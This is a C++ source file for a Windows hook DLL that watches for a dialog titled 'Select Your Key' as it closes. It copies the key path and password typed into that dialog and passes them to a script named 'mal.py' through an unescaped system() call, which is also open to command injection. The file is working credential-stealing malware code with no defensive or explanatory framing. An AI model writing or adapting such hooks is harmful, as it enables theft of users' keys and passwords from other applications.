
// HookDLL.cpp
#include "HookDLL.h"
#include <windows.h>
#include <fstream>
#include <iostream>
#include <filesystem>

HINSTANCE hInstance;
HHOOK hCbtHook = NULL;
WCHAR szPath[MAX_PATH];
WCHAR szPass[MAX_PATH];

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        hInstance = hModule;
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

std::string ws2s(const std::wstring& wstr) {
    int bufferSize = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
    if (bufferSize == 0) {
        return "";
    }
    std::string str(bufferSize - 1, 0); // Null terminator 제외
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &str[0], bufferSize, NULL, NULL);
    return str;
}

// Function to handle CBT hook events
LRESULT CALLBACK CBTProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HCBT_DESTROYWND) {
        HWND hwnd = (HWND)wParam;
        WCHAR windowText[256];
        GetWindowTextW(hwnd, windowText, sizeof(windowText) / sizeof(WCHAR));
        // Convert wide string to UTF-8 string for logging
        std::string textString = ws2s(windowText);

        // Compare windowText to "Select Your Key"
        if (wcscmp(windowText, L"Select Your Key") == 0) {
            HWND hTextBox = GetDlgItem(hwnd, 1001);
            GetWindowText(hTextBox, szPath, MAX_PATH);
            int len = GetWindowTextLength(hTextBox);
            printf("textlen : %d ", len);
            wprintf(L"szPath : %s ", szPath);

            int bufferSize = WideCharToMultiByte(CP_UTF8, 0, szPath, -1, NULL, 0, NULL, NULL);
            char* szText = new char[bufferSize];
            WideCharToMultiByte(CP_UTF8, 0, szPath, -1, szText, bufferSize, NULL, NULL);

            HWND hPassIdBox = GetDlgItem(hwnd, 1002);
            GetWindowText(hPassIdBox, szPass, MAX_PATH);
            wprintf(L"Passlen : %s ", szPass);
            int passbufferSize = WideCharToMultiByte(CP_UTF8, 0, szPass, -1, NULL, 0, NULL, NULL);
            char* szPassText = new char[passbufferSize];
            WideCharToMultiByte(CP_UTF8, 0, szPass, -1, szPassText, passbufferSize, NULL, NULL);

            std::filesystem::path currentPath = std::filesystem::current_path();
            std::cout << "cur path: " << currentPath << std::endl;

            char cmd[1024];
            memset(cmd, 0, sizeof(cmd));
            snprintf(cmd, sizeof(cmd), "python %s\\mal.py \"%s\" \"%s\"", currentPath.string().c_str(), szText, szPassText);
            printf("cmd : %s ", cmd);
            system(cmd);

            delete[] szPassText;
            delete[] szText;
        }
    }
    return CallNextHookEx(hCbtHook, nCode, wParam, lParam);
}